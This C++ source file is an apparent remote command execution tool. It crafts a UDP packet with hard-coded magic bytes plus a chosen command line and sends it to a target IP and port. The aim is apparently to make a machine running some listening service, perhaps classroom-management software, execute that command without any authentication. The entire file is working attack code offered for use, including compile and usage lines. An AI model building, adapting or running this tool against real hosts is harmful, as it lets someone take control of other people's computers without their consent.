//g++ -s -Os $ME -lws2_32 -o JYTM_ExecCmd.exe
#include <winsock2.h>
//#include <iostream> // Use printf() like a boss
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>

using namespace std;

const char EXECCMD_MAGIC1[12 + 1] = "\x44\x4D\x4F\x43\x00\x00\x01\x00\x6E\x03\x00\x00";
const char EXECCMD_MAGIC2[32 + 1] = "\x20\x4E\x00\x00\x0A\xC7\xE1\x23\x61\x03\x00\x00\x61\x03\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x0F\x00\x00\x00\x01\x00\x00\x00";
const char EXECCMD_PADDING[16 + 1] = "\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00";

struct ExecCmd {
	char magic1[12];
	char random[16];
	char magic2[32];
	wchar_t cmd[256];
	wchar_t arg[159];
	char padding[16];
	
	ExecCmd(const wchar_t *cmd, const wchar_t *arg) {
		memcpy(magic1, EXECCMD_MAGIC1, 12);
		memcpy(magic2, EXECCMD_MAGIC2, 32);
		memcpy(padding, EXECCMD_PADDING, 16);
		wcscpy(this->cmd, cmd);
		wcscpy(this->arg, arg);
		
		for(int i = 0; i < 16; i++)
			random[i] = rand() & 0xff;
	}
} __attribute__((packed));

void SendUDP(int s, const char *host, int port, void *buf, size_t len) {	
	sockaddr_in si = {0};
	si.sin_family = AF_INET;
	si.sin_addr.S_un.S_addr = inet_addr(host);
	si.sin_port = htons(port);
	
	sendto(s, (const char *)buf, len, 0, (sockaddr *)&si, sizeof(si));
}

int main(int argc, char *argv[]) {
	//for(int i = 0; i < argc; i++)
	//	fprintf(stderr, "argv[%d]\t= %s\n", i, argv[i]);
	
	if(argc < 4) {
		fprintf(stderr, "Usage: %s <IP> <port> \"<cmdline>\" \"[args]\"", argv[0]);
		return 1;
	}
	
	srand(time(NULL));
	
	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 2), &wsa);
	int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	
	wchar_t cmd[MAX_PATH];
	wchar_t arg[MAX_PATH] = L"";
	mbstowcs(cmd, argv[3], MAX_PATH);
	if(argc > 4)
		mbstowcs(arg, argv[4], MAX_PATH);
	
	ExecCmd c(cmd, arg);
	SendUDP(s, argv[1], atoi(argv[2]), &c, sizeof(c));
	
	closesocket(s);
	WSACleanup();
	return 0;
}